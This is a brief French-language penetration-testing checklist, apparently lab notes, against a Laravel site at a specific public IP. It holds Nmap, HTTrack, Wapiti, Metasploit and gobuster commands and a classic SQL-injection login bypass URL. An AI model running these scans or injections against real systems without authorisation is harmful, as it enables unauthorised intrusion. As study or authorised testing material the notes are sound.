# Cybersecurity


## LARAVEL 

Port => http://45.86.36.184/public

1. Scan réseau avec Nmap
nmap -sS -sV -O -p- 45.86.36.184

2.	Analyse web avec Httrack
httrack http://45.86.36.184/public/ -O ~/httrack_clones



3. Wapiti 
Report de vulnerabilité
wapiti -u http://45.86.36.194/public/

4. Scan de vulnérability
Metasploit
- Scanner les en-têtes HTTP 
- Scanner les répertoires disponibles 
- Scanner les titres de pages 


5. Injection sql
http://45.86.36.184/public/login?user=1' OR '1'='1



6. Brute Force
gobuster dir -u http://45.86.36.184/public/ -w /usr/share/wordlists/dirb/common.txt                                                 


